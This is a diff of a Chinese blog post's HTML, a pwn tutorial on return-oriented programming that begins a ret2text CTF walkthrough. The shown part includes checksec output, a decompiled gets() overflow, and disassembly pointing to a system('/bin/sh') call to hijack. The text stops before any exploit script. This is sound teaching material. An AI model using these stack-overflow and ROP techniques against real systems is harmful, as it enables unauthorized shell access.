@@ -1,246 +1,319 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-default-color-scheme=auto>
+
+
+
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/css/main.css">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/SecureNexusLab.png">
+  <link rel="icon" href="/img/SecureNexusLab.png">
+  
 
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"v4ethan.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="Basic-ROP-Learning ROP(Return-Oriented Programming)概述 ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 1.">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fishcanf1y">
+  <meta name="keywords" content="fishcanf1y">
+  
+    <meta name="description" content="Basic-ROP-LearningROP(Return-Oriented Programming)概述ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 1. 基">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Basic ROP Learning">
-<meta property="og:url" content="https://v4ethan.github.io/2025/04/19/Basic-ROP-Learning/index.html">
-<meta property="og:site_name" content="V4Ethan">
-<meta property="og:description" content="Basic-ROP-Learning ROP(Return-Oriented Programming)概述 ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 1.">
+<meta property="og:url" content="https://fishcanf1y.github.io/2025/04/19/Basic-ROP-Learning/index.html">
+<meta property="og:site_name" content="fishcanf1y">
+<meta property="og:description" content="Basic-ROP-LearningROP(Return-Oriented Programming)概述ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 1. 基">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-04-19T05:55:32.000Z">
 <meta property="article:modified_time" content="2025-06-27T12:28:39.439Z">
-<meta property="article:author" content="V4Ethan">
+<meta property="article:author" content="fishcanf1y">
 <meta property="article:tag" content="Pwn">
-<meta name="twitter:card" content="summary">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Basic ROP Learning - fishcanf1y</title>
 
-<link rel="canonical" href="https://v4ethan.github.io/2025/04/19/Basic-ROP-Learning/">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'en'
-  };
-</script>
 
-  <title>Basic ROP Learning | V4Ethan</title>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
 
+  
+<link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
 
 
 
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fishcanf1y.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
+  
+  <script src="/js/sakura.js"></script>
+  <script src="/js/love.js"></script>
 <!-- hexo injector head_end start -->
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --></head>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
 
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
+<body>
+  
 
-  <div class="site-meta">
+  <header>
+    
 
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">V4Ethan</h1>
-      <span class="logo-line-after"><i></i></span>
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fishcanf1y&#39;s blog</strong>
     </a>
-  </div>
 
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/index.html" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/index.html" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
-
-  </li>
-  </ul>
 </nav>
 
+  
 
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background.PNG') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Basic ROP Learning"></span>
+          
+        </div>
 
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-19 13:55" pubdate>
+          April 19, 2025 pm
+        </time>
+      </span>
+    
+  </div>
 
-</div>
-    </header>
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k words
+        
+      </span>
+    
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 mins
+        
+      </span>
+    
+
+    
+    
   </div>
 
 
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://v4ethan.github.io/2025/04/19/Basic-ROP-Learning/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="V4Ethan">
-      <meta itemprop="description" content="V4Ethan's Blog">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="V4Ethan">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          Basic ROP Learning
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2025-04-19 13:55:32" itemprop="dateCreated datePublished" datetime="2025-04-19T13:55:32+08:00">2025-04-19</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-06-27 20:28:39" itemprop="dateModified" datetime="2025-06-27T20:28:39+08:00">2025-06-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+        
+      </div>
 
       
-        <h2 id="Basic-ROP-Learning">Basic-ROP-Learning</h2>
-<h2 id="ROP-Return-Oriented-Programming-概述">ROP(Return-Oriented Programming)概述</h2>
-<p>ROP(Return-Oriented Programming)是一种高级的<strong>代码复用攻击技术</strong>，主要用于绕过现代操作系统的安全防护机制（如DEP/NX）。其核心思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
-<h3 id="1-基本概念">1. <strong>基本概念</strong></h3>
-<h4 id="（1）产生背景">（1）产生背景</h4>
-<ul>
-<li>
-<p><strong>DEP/NX防护</strong>：现代系统禁止执行栈/堆上的代码（数据执行保护）。</p>
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Basic ROP Learning</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Basic-ROP-Learning"><a href="#Basic-ROP-Learning" class="headerlink" title="Basic-ROP-Learning"></a>Basic-ROP-Learning</h2><h2 id="ROP-Return-Oriented-Programming-概述"><a href="#ROP-Return-Oriented-Programming-概述" class="headerlink" title="ROP(Return-Oriented Programming)概述"></a>ROP(Return-Oriented Programming)概述</h2><p>ROP(Return-Oriented Programming)是一种高级的<strong>代码复用攻击技术</strong>，主要用于绕过现代操作系统的安全防护机制（如DEP/NX）。其核心思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
+<h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. <strong>基本概念</strong></h3><h4 id="（1）产生背景"><a href="#（1）产生背景" class="headerlink" title="（1）产生背景"></a>（1）产生背景</h4><ul>
+<li><p><strong>DEP/NX防护</strong>：现代系统禁止执行栈/堆上的代码（数据执行保护）。</p>
 </li>
-<li>
-<p><strong>ASLR防护</strong>：随机化内存布局，增加预测难度。</p>
+<li><p><strong>ASLR防护</strong>：随机化内存布局，增加预测难度。</p>
 </li>
-<li>
-<p><strong>ROP应对方案</strong>：复用已有代码（<code>.text</code>段），避免直接注入shellcode。</p>
-</li>
-</ul>
+<li><p><strong>ROP应对方案</strong>：复用已有代码（<code>.text</code>段），避免直接注入shellcode。</p>
 <span id="more"></span>
-<h4 id="（2）核心原理">（2）核心原理</h4>
-<ul>
-<li>
-<p><strong>Gadget</strong>：以<code>ret</code>指令结尾的短指令序列（如<code>pop eax; ret</code>）。</p>
+<h4 id="（2）核心原理"><a href="#（2）核心原理" class="headerlink" title="（2）核心原理"></a>（2）核心原理</h4></li>
+<li><p><strong>Gadget</strong>：以<code>ret</code>指令结尾的短指令序列（如<code>pop eax; ret</code>）。</p>
 </li>
-<li>
-<p><strong>链式调用</strong>：通过精心构造栈帧，使<code>ret</code>指令跳转到下一个gadget，形成&quot;代码链&quot;。</p>
+<li><p><strong>链式调用</strong>：通过精心构造栈帧，使<code>ret</code>指令跳转到下一个gadget，形成”代码链”。</p>
 </li>
 </ul>
 <hr>
-<h3 id="2-关键组件">2. <strong>关键组件</strong></h3>
+<h3 id="2-关键组件"><a href="#2-关键组件" class="headerlink" title="2. 关键组件"></a>2. <strong>关键组件</strong></h3><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -263,36 +336,32 @@
 </tr>
 </tbody>
 </table>
+</div>
 <hr>
-<h3 id="3-攻击步骤">3. <strong>攻击步骤</strong></h3>
-<ol>
-<li>
-<p><strong>信息泄露</strong></p>
+<h3 id="3-攻击步骤"><a href="#3-攻击步骤" class="headerlink" title="3. 攻击步骤"></a>3. <strong>攻击步骤</strong></h3><ol>
+<li><p><strong>信息泄露</strong></p>
 <ul>
 <li>获取内存地址（绕过ASLR），如通过格式化字符串漏洞泄露libc基址。</li>
 </ul>
 </li>
-<li>
-<p><strong>寻找Gadgets</strong></p>
+<li><p><strong>寻找Gadgets</strong></p>
 <ul>
 <li>使用工具（如<code>ROPgadget</code>、<code>ropper</code>）扫描二进制文件，收集可用gadgets。</li>
 </ul>
 </li>
-<li>
-<p><strong>构造ROP Chain</strong></p>
+<li><p><strong>构造ROP Chain</strong></p>
 <ul>
 <li>组合gadgets实现目标功能（如调用<code>system(&quot;/bin/sh&quot;)</code>）。</li>
 </ul>
 </li>
-<li>
-<p><strong>触发漏洞</strong></p>
+<li><p><strong>触发漏洞</strong></p>
 <ul>
 <li>通过栈溢出等漏洞覆盖返回地址，跳转到第一个gadget。</li>
 </ul>
 </li>
 </ol>
 <hr>
-<h3 id="4-防御措施">4. <strong>防御措施</strong></h3>
+<h3 id="4-防御措施"><a href="#4-防御措施" class="headerlink" title="4. 防御措施"></a>4. <strong>防御措施</strong></h3><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -319,250 +388,563 @@
 </tr>
 </tbody>
 </table>
-<h3 id="5-实例-Linux-x86-ROP-Exploit">5.实例 Linux x86 ROP Exploit</h3>
-<h5 id="1-ret2text">(1) ret2text</h5>
-<ul>
-<li>
-<h4 id="基本分析"><strong>基本分析</strong></h4>
-</li>
+</div>
+<h3 id="5-实例-Linux-x86-ROP-Exploit"><a href="#5-实例-Linux-x86-ROP-Exploit" class="headerlink" title="5.实例 Linux x86 ROP Exploit"></a>5.实例 Linux x86 ROP Exploit</h3><h5 id="1-ret2text"><a href="#1-ret2text" class="headerlink" title="(1) ret2text"></a>(1) ret2text</h5><ul>
+<li><h4 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a><strong>基本分析</strong></h4></li>
 </ul>
 <p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">点击下载: ret2text</a></p>
 <p>先看看程序的保护机制</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~ checksec ret2text</span><br><span class="line">[*] <span class="string">&#x27;/ret2text&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs Bash">~ checksec ret2text
+[*] <span class="hljs-string">&#x27;/ret2text&#x27;</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+    Debuginfo:  Yes</code></pre></div>
 <p>可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span>
+<span class="hljs-function"></span>&#123;
+  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span>
+
+  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);
+  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);
+  <span class="hljs-built_in">gets</span>(s);
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;</code></pre></div>
 <p>我们可以看到，程序在<code>main</code>函数使用了很可疑的<code>gets</code>，那程序中就存在栈溢出漏洞，我们回到IDA看反汇编代码</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0</span>80485FD secure          proc near</span><br><span class="line">.text:<span class="number">0</span>80485FD</span><br><span class="line">.text:<span class="number">0</span>80485FD input           = dword ptr <span class="number">-10</span>h</span><br><span class="line">.text:<span class="number">0</span>80485FD secretcode      = dword ptr <span class="number">-0</span>Ch</span><br><span class="line">.text:<span class="number">0</span>80485FD</span><br><span class="line">.text:<span class="number">0</span>80485FD ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0</span>80485FD                 push    ebp</span><br><span class="line">.text:<span class="number">0</span>80485FE                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0</span>8048600                 sub     esp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0</span>8048603                 mov     dword ptr [esp], <span class="number">0</span> ; timer</span><br><span class="line">.text:<span class="number">0</span>804860A                 call    _time</span><br><span class="line">.text:<span class="number">0</span>804860F                 mov     [esp], eax      ; seed</span><br><span class="line">.text:<span class="number">0</span>8048612                 call    _srand</span><br><span class="line">.text:<span class="number">0</span>8048617                 call    _rand</span><br><span class="line">.text:<span class="number">0</span>804861C                 mov     [ebp+secretcode], eax</span><br><span class="line">.text:<span class="number">0</span>804861F                 lea     eax, [ebp+input]</span><br><span class="line">.text:<span class="number">0</span>8048622                 mov     [esp<span class="number">+4</span>], eax</span><br><span class="line">.text:<span class="number">0</span>8048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:<span class="number">0</span>804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:<span class="number">0</span>8048632                 mov     eax, [ebp+input]</span><br><span class="line">.text:<span class="number">0</span>8048635                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:<span class="number">0</span>8048638                 jnz     <span class="type">short</span> locret_8048646</span><br><span class="line">.text:<span class="number">0</span>804863A                 mov     dword ptr [esp], offset command ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">0</span>8048641                 call    _system </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80485FD secure          proc near
+.text:<span class="hljs-number">0</span>80485FD
+.text:<span class="hljs-number">0</span>80485FD input           = dword ptr <span class="hljs-number">-10</span>h
+.text:<span class="hljs-number">0</span>80485FD secretcode      = dword ptr <span class="hljs-number">-0</span>Ch
+.text:<span class="hljs-number">0</span>80485FD
+.text:<span class="hljs-number">0</span>80485FD ; __unwind &#123;
+.text:<span class="hljs-number">0</span>80485FD                 push    ebp
+.text:<span class="hljs-number">0</span>80485FE                 mov     ebp, esp
+.text:<span class="hljs-number">0</span>8048600                 sub     esp, <span class="hljs-number">28</span>h
+.text:<span class="hljs-number">0</span>8048603                 mov     dword ptr [esp], <span class="hljs-number">0</span> ; timer
+.text:<span class="hljs-number">0</span>804860A                 call    _time
+.text:<span class="hljs-number">0</span>804860F                 mov     [esp], eax      ; seed
+.text:<span class="hljs-number">0</span>8048612                 call    _srand
+.text:<span class="hljs-number">0</span>8048617                 call    _rand
+.text:<span class="hljs-number">0</span>804861C                 mov     [ebp+secretcode], eax
+.text:<span class="hljs-number">0</span>804861F                 lea     eax, [ebp+input]
+.text:<span class="hljs-number">0</span>8048622                 mov     [esp<span class="hljs-number">+4</span>], eax
+.text:<span class="hljs-number">0</span>8048626                 mov     dword ptr [esp], offset unk_8048760
+.text:<span class="hljs-number">0</span>804862D                 call    ___isoc99_scanf
+.text:<span class="hljs-number">0</span>8048632                 mov     eax, [ebp+input]
+.text:<span class="hljs-number">0</span>8048635                 cmp     eax, [ebp+secretcode]
+.text:<span class="hljs-number">0</span>8048638                 jnz     <span class="hljs-type">short</span> locret_8048646
+.text:<span class="hljs-number">0</span>804863A                 mov     dword ptr [esp], offset command ; <span class="hljs-string">&quot;/bin/sh&quot;</span>
+.text:<span class="hljs-number">0</span>8048641                 call    _system 
+</code></pre></div>
 <p>在<code>secure</code>函数中我们看到了存在调用<code>system(&quot;/bin/sh&quot;)</code>，那我们的思路就是只能能覆盖到这个地址(即<code>0x0804863A</code>)上就可以拿到shell了，现在再来确定我们能够控制的内存的起始地址距离<code>main</code> 函数的返回地址的字节数。</p>
